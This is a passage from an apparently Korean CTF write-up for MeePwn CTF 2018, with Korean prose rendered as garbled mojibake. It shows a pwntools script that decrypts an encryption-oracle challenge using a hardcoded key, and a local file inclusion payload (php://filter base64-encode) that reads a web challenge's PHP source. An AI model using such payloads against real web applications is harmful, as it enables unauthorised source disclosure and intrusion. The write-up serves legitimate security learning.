	<span style="color:#ff79c6">return</span> (iv <span style="color:#ff79c6">+</span> _aes<span style="color:#ff79c6">.</span>encrypt(_enc))<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;hex&#39;</span>)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt</span>(data):
	data <span style="color:#ff79c6">=</span> data<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;hex&#39;</span>)
	<span style="color:#ff79c6">try</span>:
		iv <span style="color:#ff79c6">=</span> data[:blocksize]
		_aes <span style="color:#ff79c6">=</span> AES<span style="color:#ff79c6">.</span>new(encrypt_key, AES<span style="color:#ff79c6">.</span>MODE_CBC, iv)
		data <span style="color:#ff79c6">=</span> _aes<span style="color:#ff79c6">.</span>decrypt(data[blocksize:])
		data <span style="color:#ff79c6">=</span> unpad(data)
		plaintext <span style="color:#ff79c6">=</span> data[:<span style="color:#ff79c6">-</span>hmac_size]
		mac <span style="color:#ff79c6">=</span> data[<span style="color:#ff79c6">-</span>hmac_size:]
		<span style="color:#ff79c6">if</span> mac <span style="color:#ff79c6">==</span> compute_hmac(plaintext): <span style="color:#ff79c6">return</span> True
		<span style="color:#ff79c6">else</span>: <span style="color:#ff79c6">return</span> False
	<span style="color:#ff79c6">except</span>: <span style="color:#ff79c6">return</span> False

<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;&#34;&#34;Welcome to our super secure enc/dec server. 
</span><span style="color:#f1fa8c">We use hmac, so, plz don&#39;t hack us (and you can&#39;t). Thanks.&#34;&#34;&#34;</span>

<span style="color:#ff79c6">while</span> True:
	choice <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#8be9fd;font-style:italic">raw_input</span>(menu))
	<span style="color:#ff79c6">if</span> choice <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span>:
		_pre <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">raw_input</span>(<span style="color:#f1fa8c">&#39;prefix: &#39;</span>)
		_suf <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">raw_input</span>(<span style="color:#f1fa8c">&#39;suffix: &#39;</span>)
		<span style="color:#ff79c6">print</span> encrypt(prefix<span style="color:#ff79c6">=</span>_pre, suffix<span style="color:#ff79c6">=</span>_suf)
	<span style="color:#ff79c6">elif</span> choice <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">2</span>:
		_data <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">raw_input</span>(<span style="color:#f1fa8c">&#39;data: &#39;</span>)
		<span style="color:#ff79c6">if</span> decrypt(_data):
			<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#39;OK&#39;</span>
		<span style="color:#ff79c6">else</span>:
			<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#39;KO&#39;</span>
	<span style="color:#ff79c6">elif</span> choice <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">3</span>:
		sys<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">0</span>)
	<span style="color:#ff79c6">else</span>:
		choice <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#8be9fd;font-style:italic">raw_input</span>(menu))
</code></pre></td></tr></table>
</div>
</div><p>ì„œë²„ì— ì‹¤ì œë¡œ ì €ì¥ë˜ì–´ ìˆëŠ” <code>secret</code>ì˜ ê°’ì„ ì°¾ì•„ì•¼ í•˜ëŠ” ë¬¸ì œì´ë‹¤.
ncë¥¼ í†µí•´ ë¬¸ì œì— ì ‘ì†í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ nc 206.189.92.209 12345
Welcome to our super secure enc/dec server. 
We use hmac, so, plz don<span style="color:#f1fa8c">&#39;t hack us (and you can&#39;</span>t<span style="color:#ff79c6">)</span>. Thanks.
Choose one:
1. encrypt data
2. decrypt data
3. quit
1
prefix: aaa
suffix: bbb
d9d860ba5708b4758a95b84b99459683dde5d09d8a137f2d436cf6b42d3519b3eb5642f9802c5957c867f0d83505462aa9f5d6024238c8618cff0832a15913446e0ff402ffb874968b2ce4b960e37517b557f32570ead1b3cd8e8ff6bf1a907b
Choose one:
1. encrypt data
2. decrypt data
3. quit
2
data: d9d860ba5708b4758a95b84b99459683dde5d09d8a137f2d436cf6b42d3519b3eb5642f9802c5957c867f0d83505462aa9f5d6024238c8618cff0832a15913446e0ff402ffb874968b2ce4b960e37517b557f32570ead1b3cd8e8ff6bf1a907b
OK
Choose one:
1. encrypt data
2. decrypt data
3. quit
</code></pre></td></tr></table>
</div>
</div><p><code>encrypt data</code>, <code>decrypt data</code>, <code>quit</code> 3 ê°œì˜ ë©”ë‰´ê°€ ìˆê³ , <code>encrypt data</code>ë¥¼ ì„ íƒ í•  ê²½ìš° <code>prefix</code>ì™€ <code>suffix</code>ë¥¼ ì…ë ¥ í•´ ì£¼ì–´ì•¼ í•œë‹¤.
ë˜í•œ <code>decrypt data</code>ë¥¼ ì„ íƒ í•  ê²½ìš°ì—ëŠ” ë³µí˜¸í™” í•  ë°ì´í„°ë¥¼ ì…ë ¥ë°›ê³  ë³µí˜¸í™” ì„±ê³µ ì‹œ <code>OK</code>ë¥¼, ë³µí˜¸í™”ë¥¼ ì‹¤íŒ¨ í•  ê²½ìš°ì—ëŠ” <code>KO</code>ë¥¼ ì¶œë ¥ í•´ ì¤€ë‹¤.
ì†ŒìŠ¤ì½”ë“œë¥¼ í™•ì¸ í•´ ë³´ë©´ <code>decrypt</code> í•¨ìˆ˜ë¥¼ ì œê³µ í•´ ì£¼ì—ˆìœ¼ë©°, <code>encrypt_key</code>ê°€ <code>0xff * 32</code>ë¡œ ë˜ì–´ ìˆë‹¤.
ê·¸ë˜ì„œ í˜¹ì‹œë‚˜ í•´ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì œê³µí•´ ì¤€ <code>decrypt</code> í•¨ìˆ˜ë¥¼ ë°”íƒ•ìœ¼ë¡œ exploit ì½”ë“œë¥¼ ì§  í›„ ëŒë ¤ ë³´ì•˜ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python2</span>
<span style="color:#ff79c6">from</span> Crypto.Cipher <span style="color:#ff79c6">import</span> AES
<span style="color:#ff79c6">import</span> hmac<span style="color:#ff79c6">,</span> hashlib
<span style="color:#ff79c6">import</span> os
<span style="color:#ff79c6">import</span> sys
<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>

<span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Unbuffered</span>(<span style="color:#8be9fd;font-style:italic">object</span>):
    <span style="color:#ff79c6">def</span> __init__(self, stream):
        self<span style="color:#ff79c6">.</span>stream <span style="color:#ff79c6">=</span> stream
    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">write</span>(self, data):
        self<span style="color:#ff79c6">.</span>stream<span style="color:#ff79c6">.</span>write(data)
        self<span style="color:#ff79c6">.</span>stream<span style="color:#ff79c6">.</span>flush()
    <span style="color:#ff79c6">def</span> __getattr__(self, attr):
        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">getattr</span>(self<span style="color:#ff79c6">.</span>stream, attr)

sys<span style="color:#ff79c6">.</span>stdout <span style="color:#ff79c6">=</span> Unbuffered(sys<span style="color:#ff79c6">.</span>stdout)
sys<span style="color:#ff79c6">.</span>stderr <span style="color:#ff79c6">=</span> None

encrypt_key <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\xff</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">32</span>
hmac_secret <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
blocksize <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">16</span>
hmac_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">20</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">unpad</span>(msg):
	<span style="color:#ff79c6">return</span> msg[:<span style="color:#ff79c6">-</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(msg[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>)]

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">compute_hmac</span>(msg):
	<span style="color:#ff79c6">return</span> hmac<span style="color:#ff79c6">.</span>new(hmac_secret, msg, digestmod<span style="color:#ff79c6">=</span>hashlib<span style="color:#ff79c6">.</span>sha1)<span style="color:#ff79c6">.</span>digest()

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt</span>(data):
	data <span style="color:#ff79c6">=</span> data<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;hex&#39;</span>)
	<span style="color:#ff79c6">try</span>:
		iv <span style="color:#ff79c6">=</span> data[:blocksize]
		_aes <span style="color:#ff79c6">=</span> AES<span style="color:#ff79c6">.</span>new(encrypt_key, AES<span style="color:#ff79c6">.</span>MODE_CBC, iv)
		data <span style="color:#ff79c6">=</span> _aes<span style="color:#ff79c6">.</span>decrypt(data[blocksize:])
		data <span style="color:#ff79c6">=</span> unpad(data)
		plaintext <span style="color:#ff79c6">=</span> data[:<span style="color:#ff79c6">-</span>hmac_size]
		mac <span style="color:#ff79c6">=</span> data[<span style="color:#ff79c6">-</span>hmac_size:]
		<span style="color:#ff79c6">if</span> mac <span style="color:#ff79c6">==</span> compute_hmac(plaintext):
			<span style="color:#ff79c6">print</span> plaintext
			<span style="color:#ff79c6">return</span> True
		<span style="color:#ff79c6">else</span>: <span style="color:#ff79c6">return</span> False
	<span style="color:#ff79c6">except</span>: <span style="color:#ff79c6">return</span> False

<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] ESOR exploit start&#34;</span>

s <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#34;206.189.92.209&#34;</span>, <span style="color:#bd93f9">12345</span>)

<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Connect OK with ESOR&#34;</span> 

s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;3. quit&#34;</span>)

s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1&#34;</span>)

s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;prefix: &#34;</span>)
s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;aaa&#34;</span>)
s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;suffix: &#34;</span>)
s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;bbb&#34;</span>)

recv_data <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;3. quit&#34;</span>)

data <span style="color:#ff79c6">=</span> recv_data<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;Choose one:&#34;</span>)[<span style="color:#bd93f9">0</span>][:<span style="color:#bd93f9">192</span>]

<span style="color:#ff79c6">print</span> data

<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Check Encrypted data OK&#34;</span>

decrypt(data)
</code></pre></td></tr></table>
</div>
</div><p>ncë¡œ ì ‘ì†í•œ í›„, ì•”í˜¸í™” ëœ ë°ì´í„°ë¥¼ ë°›ì•„ ì œê³µí•´ ì¤€ <code>decrypt</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš© í•´ ë³µí˜¸í™” í•œ í›„ <code>print plaintext</code>ë§Œ ì¶”ê°€ í•´ ì£¼ì—ˆë‹¤.
ê·¸ ê²°ê³¼ ì• ë’¤ë¡œ ë‚´ê°€ ì…ë ¥ í•œ <code>prefix</code>ì™€ <code>suffix</code>ê°€ ìˆëŠ” flagë¥¼ ì–»ì„ ìˆ˜ ìˆì—ˆë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">FLAG : MeePwnCTF{pooDL3-this-is-la-vie-en-rose-P00dle!}
</code></pre></td></tr></table>
</div>
</div><p>ì•„ë¬´ë˜ë„ ì´ ë¬¸ì œëŠ” ì¶œì œìê°€ ì˜ëª» ë‚¸ ë¬¸ì œê°™ë‹¤.
flagì˜ ë‚´ìš©ìœ¼ë¡œ ì¶”ì¸¡í•˜ê±´ë°, ì•„ë§ˆë„ <code>POODLE</code> ê³µê²©ì„ í•´ì•¼í•˜ëŠ” ë¬¸ì œê°€ ì•„ë‹ˆì—ˆë‚˜ ì‹¶ë‹¤.
ê·¸ëŸ°ë°, ì˜¤ëŠ˜ ë‹¤ì‹œ ì½”ë“œë¥¼ ëŒë ¤ë³´ë‹ˆ ì´ì œëŠ” ë¬¸ì œê°€ í’€ë¦¬ì§€ ì•Šì•˜ë‹¤.
ëŒ€íšŒ ë„ì¤‘ ì¶œì œìê°€ ì˜ëª»ëœ ê²ƒì„ ê¹¨ë‹«ê³  ë¬¸ì œë¥¼ ìˆ˜ì •í•œ ê²ƒ ê°™ë‹¤.
<del>IRCëŠ” ëª¨ë¥´ê² ì§€ë§Œ í™ˆí˜ì´ì§€ì—ëŠ” ê³µì§€ê°€ ì—†ì—ˆë‹¤&hellip; ì ìˆ˜í•¨ íŒ¨ì¹˜ ì¼&hellip;</del></p>
<hr>
<h3 id="crypto-ezchallz">[CRYPTO] EZCHALLZ</h3>
<p>ë¬¸ì œ ì •ë³´ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">http://206.189.92.209/ezchallz/
</code></pre></td></tr></table>
</div>
</div><p>í™ˆí˜ì´ì§€ì— ì ‘ì† í•´ ë³´ë©´ ì•„ë˜ì™€ ê°™ì€ í™”ë©´ë§Œ ìˆë‹¤.</p>
<p><img src="/images/CTF/MeePwn2018/solved/meepwn_07.png" alt=""></p>
<p><code>Homepage</code>ì™€ <code>Free register</code>, ë”± ë‘ê°œì˜ ë©”ë‰´ë§Œ ìˆì„ ë¿ì´ì—ˆë‹¤.
<code>Homepage</code>ë¥¼ ëˆ„ë¥´ë©´ ìœ„ì™€ ë™ì¼í•œ í™”ë©´ì´ ë‚˜íƒ€ë‚œë‹¤.
<code>Free register</code>ë¥¼ ëˆ„ë¥¼ ê²½ìš°ì—ëŠ” ì•„ë˜ì™€ ê°™ì´ ê°’ì„ ì…ë ¥í•  ìˆ˜ ìˆìœ¼ë©°, <code>Register</code> ë²„íŠ¼ì„ ëˆ„ë¥´ë©´ ê°€ì§œ flagë¥¼ ì¶œë ¥ í•´ ì¤€ë‹¤.</p>
<p><img src="/images/CTF/MeePwn2018/solved/meepwn_08.png" alt=""></p>
<p><img src="/images/CTF/MeePwn2018/solved/meepwn_09.png" alt=""></p>
<p>ì†ŒìŠ¤ì½”ë“œë¥¼ ë´ë„ ë”±íˆ ëˆˆì— ë„ëŠ”ê²ƒì´ ì—†ì–´ <code>URL</code>ì„ ì‚´í´ ë³´ì•˜ë‹¤.
ê°ê° ë²„íŠ¼ì„ ëˆ„ë¥¼ ê²½ìš° ì´ë™í•˜ëŠ” URLì€ ë‹¤ìŒê³¼ ê°™ë‹¤.</p>
<blockquote>
<p>Homepageë¥¼ ëˆ„ë¥¼ ê²½ìš° : http://206.189.92.209/ezchallz/index.php<br>
Free registerë¥¼ ëˆ„ë¥¼ ê²½ìš° : http://206.189.92.209/ezchallz/index.php?page=register<br>
ê°’ ì…ë ¥ í›„ Register ë²„íŠ¼ì„ ëˆ„ë¥¼ ê²½ìš° : http://206.189.92.209/ezchallz/users/b8240bb93fb5c4321196ff675b7f98eb/flag.php</p>
</blockquote>
<p>ì¿¼ë¦¬ ìŠ¤íŠ¸ë§ì—ì„œ <code>page</code>ë¥¼ ì¸ìë¡œ ë°›ì•„ í˜ì´ì§€ë¥¼ ì´ë™í•œë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆë‹¤.
ê·¸ëŸ°ë° ì´ ê²½ìš° <code>LFI</code> ê³µê²©ì— ì·¨ì•½í•  ìˆ˜ ìˆë‹¤.
<code>page</code>ì˜ ê°’ì— ë‹¤ìŒê³¼ ê°™ì´ ì…ë ¥í•œë‹¤ë©´, í•´ë‹¹ íŒŒì¼ì˜ ë‚´ìš©ì„ ì½ì„ ìˆ˜ ìˆë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">?page=php://filter/convert.base64-encode/resource=index
</code></pre></td></tr></table>
</div>
</div><p>ê·¸ ê²°ê³¼ ì•„ë˜ì™€ ê°™ì´ <code>base64</code>ë¡œ ì¸ì½”ë”© ëœ ì†ŒìŠ¤ì½”ë“œë¥¼ ì–»ì„ ìˆ˜ ìˆì—ˆë‹¤.</p>
<p><img src="/images/CTF/MeePwn2018/solved/meepwn_10.png" alt=""></p>
<p><code>index</code>ì™€ <code>register</code> í˜ì´ì§€ì˜ ì†ŒìŠ¤ì½”ë“œë¥¼ ì–»ì–´ <code>base64</code>ë¡œ ë””ì½”ë”© í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.</p>
<ul>
<li>index.php</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
